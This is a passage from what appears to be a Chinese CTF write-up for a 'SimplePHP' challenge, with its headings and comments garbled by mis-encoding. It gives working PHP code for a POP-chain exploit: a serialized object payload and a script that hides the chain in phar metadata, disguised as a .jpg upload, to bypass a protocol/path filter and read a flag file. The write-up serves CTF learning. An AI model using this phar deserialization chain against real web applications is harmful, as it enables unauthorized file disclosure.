<span class="hljs-variable">$params</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;params = <span class="hljs-keyword">array</span>();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-variable">$key</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;params[<span class="hljs-variable">$key</span>])) &#123;<br>            <span class="hljs-variable">$value</span> = <span class="hljs-variable language_">$this</span>-&gt;params[<span class="hljs-variable">$key</span>];<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$value</span> = <span class="hljs-string">&quot;index.php&quot;</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">file_get</span>(<span class="hljs-variable">$value</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">file_get</span>(<span class="hljs-params"><span class="hljs-variable">$value</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-comment">// å­˜åœ¨æ–‡ä»¶æ‰“å¼€å‡½æ•°ï¼Œå¯ä»¥ç”¨äºè·å–æ–‡ä»¶ä¿¡æ¯</span><br>        <span class="hljs-variable">$text</span> = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$value</span>));<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$text</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;index.php&#x27;</span>;<br><span class="hljs-variable">$name</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Show</span>(<span class="hljs-variable">$file</span>);<br><br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Test</span>();<br><span class="hljs-variable">$b</span>-&gt;params = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;source&#x27;</span>=&gt;<span class="hljs-string">&#x27;f1ag.php&#x27;</span>);<br><span class="hljs-variable">$name</span>-&gt;str=<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;str&#x27;</span>=&gt;<span class="hljs-variable">$b</span>);<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">C1e4r</span>(<span class="hljs-variable">$name</span>);<br><br><span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<br><br><span class="hljs-comment">// @unserialize($a);</span><br><br><br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><h4 id="è¾“å‡º"><a href="#è¾“å‡º" class="headerlink" title="è¾“å‡º:"></a>è¾“å‡º:</h4><p><img src="/images/2024-2-3-SimplePHP/image-20240131181102991.png" alt="image-20240131181102991"></p><h4 id="base64è§£å¯†"><a href="#base64è§£å¯†" class="headerlink" title="base64è§£å¯†:"></a>base64è§£å¯†:</h4><p><img src="/2024/02/03/2024-2-3-SimplePHP/Typora_images\image-20240131181118458.png" alt="image-20240131181118458"></p><h4 id="ååºåˆ—åŒ–æµ‹è¯•"><a href="#ååºåˆ—åŒ–æµ‹è¯•" class="headerlink" title="ååºåˆ—åŒ–æµ‹è¯•:"></a>ååºåˆ—åŒ–æµ‹è¯•:</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C1e4r</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$test</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;str = <span class="hljs-variable">$name</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;test = <span class="hljs-variable language_">$this</span>-&gt;str;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;test;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Show</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$source</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;source = <span class="hljs-variable">$file</span>;   <span class="hljs-comment">//$this-&gt;source = phar://phar.jpg</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;source;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$content</span> = <span class="hljs-variable language_">$this</span>-&gt;str[<span class="hljs-string">&#x27;str&#x27;</span>]-&gt;source;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$content</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params"><span class="hljs-variable">$key</span>,<span class="hljs-variable">$value</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-variable">$key</span> = <span class="hljs-variable">$value</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">_show</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/http|https|file:|gopher|dict|\.\.|f1ag/i&#x27;</span>,<span class="hljs-variable">$this</span>-&gt;source)) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker!&#x27;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">// è¯¥å‡½æ•°å¯ä»¥ç›´æ¥å±•ç¤ºæŒ‡å®šç›®å½•çš„æ–‡ä»¶ä¿¡æ¯ï¼Œå¯ä»¥è¿›è¡Œåˆ©ç”¨</span><br>            <span class="hljs-comment">// ä½†æ˜¯æˆ‘ä»¬éœ€è¦ç»•è¿‡preg_mathch()çš„æ£€æµ‹</span><br>            <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-variable">$this</span>-&gt;source);<br>        &#125;<br>        <br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/http|https|file:|gopher|dict|\.\./i&quot;</span>, <span class="hljs-variable">$this</span>-&gt;source)) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hacker~&quot;</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;source = <span class="hljs-string">&quot;index.php&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$params</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;params = <span class="hljs-keyword">array</span>();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-variable">$key</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;params[<span class="hljs-variable">$key</span>])) &#123;<br>            <span class="hljs-variable">$value</span> = <span class="hljs-variable language_">$this</span>-&gt;params[<span class="hljs-variable">$key</span>];<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$value</span> = <span class="hljs-string">&quot;index.php&quot;</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">file_get</span>(<span class="hljs-variable">$value</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">file_get</span>(<span class="hljs-params"><span class="hljs-variable">$value</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-comment">// å­˜åœ¨æ–‡ä»¶æ‰“å¼€å‡½æ•°ï¼Œå¯ä»¥ç”¨äºè·å–æ–‡ä»¶ä¿¡æ¯</span><br>        <span class="hljs-variable">$text</span> = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$value</span>));<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$text</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;index.php&#x27;</span>;<br><span class="hljs-variable">$name</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Show</span>(<span class="hljs-variable">$file</span>);<br><br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Test</span>();<br><span class="hljs-variable">$b</span>-&gt;params = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;source&#x27;</span>=&gt;<span class="hljs-string">&#x27;f1ag.php&#x27;</span>);<br><span class="hljs-variable">$name</span>-&gt;str=<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;str&#x27;</span>=&gt;<span class="hljs-variable">$b</span>);<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">C1e4r</span>(<span class="hljs-variable">$name</span>);<br><br><span class="hljs-comment">// $a = serialize($a);</span><br><span class="hljs-comment">// echo $a;</span><br><span class="hljs-variable">$test</span> = <span class="hljs-string">&#x27;O:5:&quot;C1e4r&quot;:2:&#123;s:4:&quot;test&quot;;N;s:3:&quot;str&quot;;O:4:&quot;Show&quot;:2:&#123;s:6:&quot;source&quot;;s:9:&quot;index.php&quot;;s:3:&quot;str&quot;;a:1:&#123;s:3:&quot;str&quot;;O:4:&quot;Test&quot;:2:&#123;s:4:&quot;file&quot;;N;s:6:&quot;params&quot;;a:1:&#123;s:6:&quot;source&quot;;s:8:&quot;f1ag.php&quot;;&#125;&#125;&#125;&#125;&#125;&#x27;</span>;<br>@<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$test</span>);<br><br><br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><h5 id="è¾“å‡º-1"><a href="#è¾“å‡º-1" class="headerlink" title="è¾“å‡º:"></a>è¾“å‡º:</h5><p><img src="/images/2024-2-3-SimplePHP/image-20240131181309988.png" alt="image-20240131181309988"></p><p>æ€»å…±æœ‰ä¸¤æ¬¡base64è¾“å‡ºï¼Œç¬¬ä¸€æ¬¡ä¸ºè‡ªåŠ¨é”€æ¯å¯¹è±¡æ—¶è§¦å‘ï¼Œç¬¬äºŒæ¬¡ä¸ºunserialize()æ—¶è§¦å‘äº§ç”Ÿï¼Œæ‰€ä»¥å¯ä»¥è¯æ˜æˆ‘ä»¬çš„åºåˆ—åŒ–æ“ä½œæ­£ç¡®ã€‚</p><p><strong>serializeåºåˆ—åŒ–å’Œpharåºåˆ—åŒ–çš„è¿è¡ŒåŸç†åŸºæœ¬åŸºæœ¬ä¸€ç›´ï¼Œåªæ˜¯è§¦å‘çš„æ–¹å¼ä¸ç›¸åŒï¼Œæ‰€ä»¥å¯ä»¥ä½¿ç”¨æ™®é€šçš„åºåˆ—åŒ–æ¥æµ‹è¯•popé“¾çš„æ­£ç¡®æ€§</strong></p><h3 id="æ„é€ pharåºåˆ—åŒ–æ–‡ä»¶è„šæœ¬"><a href="#æ„é€ pharåºåˆ—åŒ–æ–‡ä»¶è„šæœ¬" class="headerlink" title="æ„é€ pharåºåˆ—åŒ–æ–‡ä»¶è„šæœ¬:"></a>æ„é€ pharåºåˆ—åŒ–æ–‡ä»¶è„šæœ¬:</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C1e4r</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$test</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;str = <span class="hljs-variable">$name</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;test = <span class="hljs-variable language_">$this</span>-&gt;str;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;test;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Show</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$source</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;source = <span class="hljs-variable">$file</span>;   <span class="hljs-comment">//$this-&gt;source = phar://phar.jpg</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;source;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$content</span> = <span class="hljs-variable language_">$this</span>-&gt;str[<span class="hljs-string">&#x27;str&#x27;</span>]-&gt;source;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$content</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params"><span class="hljs-variable">$key</span>,<span class="hljs-variable">$value</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-variable">$key</span> = <span class="hljs-variable">$value</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">_show</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/http|https|file:|gopher|dict|\.\.|f1ag/i&#x27;</span>,<span class="hljs-variable">$this</span>-&gt;source)) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker!&#x27;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">// è¯¥å‡½æ•°å¯ä»¥ç›´æ¥å±•ç¤ºæŒ‡å®šç›®å½•çš„æ–‡ä»¶ä¿¡æ¯ï¼Œå¯ä»¥è¿›è¡Œåˆ©ç”¨</span><br>            <span class="hljs-comment">// ä½†æ˜¯æˆ‘ä»¬éœ€è¦ç»•è¿‡preg_mathch()çš„æ£€æµ‹</span><br>            <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-variable">$this</span>-&gt;source);<br>        &#125;<br>        <br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/http|https|file:|gopher|dict|\.\./i&quot;</span>, <span class="hljs-variable">$this</span>-&gt;source)) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hacker~&quot;</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;source = <span class="hljs-string">&quot;index.php&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$params</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;params = <span class="hljs-keyword">array</span>();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-variable">$key</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;params[<span class="hljs-variable">$key</span>])) &#123;<br>            <span class="hljs-variable">$value</span> = <span class="hljs-variable language_">$this</span>-&gt;params[<span class="hljs-variable">$key</span>];<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$value</span> = <span class="hljs-string">&quot;index.php&quot;</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">file_get</span>(<span class="hljs-variable">$value</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">file_get</span>(<span class="hljs-params"><span class="hljs-variable">$value</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-comment">// å­˜åœ¨æ–‡ä»¶æ‰“å¼€å‡½æ•°ï¼Œå¯ä»¥ç”¨äºè·å–æ–‡ä»¶ä¿¡æ¯</span><br>        <span class="hljs-variable">$text</span> = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$value</span>));<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$text</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;index.php&#x27;</span>;<br><span class="hljs-variable">$name</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Show</span>(<span class="hljs-variable">$file</span>);<br><br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Test</span>();<br><span class="hljs-comment">//è¿™é‡Œè¦æ³¨æ„f1ag.phpçš„è·¯å¾„ä¸æ˜¯åœ¨uploadæ–‡ä»¶å¤¹ä¸‹çš„ï¼Œæ˜¯åœ¨/var/www/html/ä¸‹,ä¹Ÿå¯ä»¥ç”¨upload/../f1ag.php</span><br><span class="hljs-variable">$b</span>-&gt;params = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;source&#x27;</span>=&gt;<span class="hljs-string">&#x27;/var/www/html/f1ag.php&#x27;</span>);<br><span class="hljs-variable">$name</span>-&gt;str=<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;str&#x27;</span>=&gt;<span class="hljs-variable">$b</span>);<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">C1e4r</span>(<span class="hljs-variable">$name</span>);<br><br><span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">&quot;pop.phar&quot;</span>);<br><span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&quot;pop.phar&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&quot;&lt;php __HALT_COMPILER(); ?&gt;&quot;</span>);<br><span class="hljs-comment">// popé“¾å†…å®¹è·å–ç‚¹</span><br><span class="hljs-variable">$o</span> = <span class="hljs-variable">$a</span>;<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$o</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;test.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br></code></pre></td></tr></table></figure><h3 id="æ›´æ”¹ç”Ÿæˆçš„pop-pharæ–‡ä»¶ä¸ºpop-jpgåä¸Šä¼ ï¼š"><a href="#æ›´æ”¹ç”Ÿæˆçš„pop-pharæ–‡ä»¶ä¸ºpop-jpgåä¸Šä¼ ï¼š" class="headerlink" title="æ›´æ”¹ç”Ÿæˆçš„pop.pharæ–‡ä»¶ä¸ºpop.jpgåä¸Šä¼ ï¼š"></a>æ›´æ”¹ç”Ÿæˆçš„pop.pharæ–‡ä»¶ä¸ºpop.jpgåä¸Šä¼ ï¼š</h3><p><strong>(ç›´æ¥æ”¹åç¼€å°±å¯ä»¥ä¿è¯æ–‡ä»¶å†…éƒ¨çš„äºŒè¿›åˆ¶å†…å®¹ä¸å˜ï¼Œå¦‚æœç”¨å·¥å…·æ”¹åç¼€ï¼Œå¯èƒ½ä¼šå¯¼è‡´æ–‡ä»¶å†…éƒ¨å†…å®¹æ”¹å˜ï¼Œä»è€Œæ— æ³•è¢«phar:&#x2F;&#x2F;åè®®è§£æ)</strong></p><p><img src="/images/2024-2-3-SimplePHP/image-20240131201607885.png" alt="image-20240131201607885"></p><p><img src="/images/2024-2-3-SimplePHP/image-20240131182313018.png" alt="image-20240131182313018"></p><p>ä¸Šä¼ æˆåŠŸï¼ï¼ï¼</p><h2 